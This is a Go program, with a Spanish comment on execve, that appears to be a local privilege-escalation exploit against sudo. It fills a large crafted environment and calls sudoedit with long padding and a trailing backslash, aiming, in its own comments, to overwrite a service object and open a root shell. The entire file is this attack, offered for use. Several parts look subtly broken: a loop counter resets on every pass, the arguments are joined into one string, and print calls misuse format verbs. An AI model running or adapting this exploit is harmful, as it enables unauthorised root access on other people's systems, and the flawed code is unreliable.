package main

import (
  "fmt"
  "os/exec"
  "os"
  "log"
  "strings"
)

/*
execve ejecuta el programa indicado por filename. filename debe ser un binario ejecutable, o bien un guion shell
(shell script) comenzando con una línea de la forma "#! intérprete [arg]" (conocida como shebang).
En el segundo caso, el intérprete debe ser un nombre de camino válido para un ejecutable que no sea
él mismo un guion y que será ejecutado con los argumentos [arg] (opcionales) más el archivo filename
a interpretar.

argv es un array de cadenas de argumentos pasados al nuevo programa. envp es un array de cadenas,
convencionalmente de la forma clave=valor, que se pasan como entorno al nuevo programa. Tanto argv
como envp deben terminar en un puntero nulo. El vector de argumentos y el entorno pueden ser accedidos por
la función "main" del programa invocado cuando se define como int main(int argc, char *argv[], char *envp[]).

*/
func execve(command string, args string, envp []string) {
  cmd := exec.Command(command, args)
  cmd.Env = envp
  out, err := cmd.CombinedOutput()
  
  fmt.Println("%s", args)
  fmt.Println("%s", envp)
  
  if err != nil {
    log.Fatalf("cmd.Run() failed with %s\n", err)
  }
  fmt.Printf("%s", out)
}

func multiply_string(text string, repetition int) string {
  repeated_string := ""

  for i:=0; i < repetition; i++ {
    repeated_string += text
  }

  return repeated_string
}

func main() {

  // sudo path
  SUDO_PATH := "/usr/bin/sudo"

  // define offset
  TARGET_OFFSET_START := 0x780 // this is just an integer

  // define fake user service object (in order to override)
  // 0x18 == 24

  FAKE_USER_SERVICE_PART := [0x18]string{"\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "\\", "\\", "\\", "\\", "\\",
                                         "\\", "\\", "X/X1234\\"}
  const user_service_len = 312
  FAKE_USER_SERVICE := [user_service_len]string{}

  for i := 0; i < user_service_len; i++ {
    j := 0
    FAKE_USER_SERVICE[i] = FAKE_USER_SERVICE_PART[j]
    j = (j+1)%24
  }
  //fmt.Println(FAKE_USER_SERVICE)
  FAKE_USER_SERVICE[311] = "X/X1234"
  //fmt.Println(FAKE_USER_SERVICE)

  // define our environment (in order to modify it as we want and open a root shell)

  offset_len := TARGET_OFFSET_START + 0xf -8
  const env_extension_len = 6

  env_array := [user_service_len + 1 + env_extension_len]string{}

  offset := ""
  for i := 0; i<(offset_len - 1); i++ {
    offset += "Z"
  }
  offset += "\\"

  env_array[0] = offset
  for i := 0; i < user_service_len; i++ {
    env_array[i+1] = FAKE_USER_SERVICE[i]
  }

  env_extension := []string{
    "LC_CTYPE=C.UTF-8@" + multiply_string("A", 0x28)+";A=",
    "LC_NUMERIC=C.UTF-8@" + multiply_string("A", 0xd8),
    "LC_TIME=C.UTF-8@" + multiply_string("A", 0x28),
    "LC_COLLATE=C.UTF-8@" + multiply_string("A", 0x28),
    "LC_IDENTIFICATION=C.UTF-8@" + multiply_string("A", 0x78), //for filling holes from freed file buffer
    "TZ=:",
  }

  for i:=0; i < env_extension_len; i++ {
    env_array[1 + user_service_len + i] = env_extension[i]
  }

  argv_array := []string{"sudoedit", "-A", "-s", multiply_string("A", 0xe0) + "\\"}
  
  argv := strings.Join(argv_array, " ")
  env := env_array[:]
  
  execve(SUDO_PATH, argv, env)
}
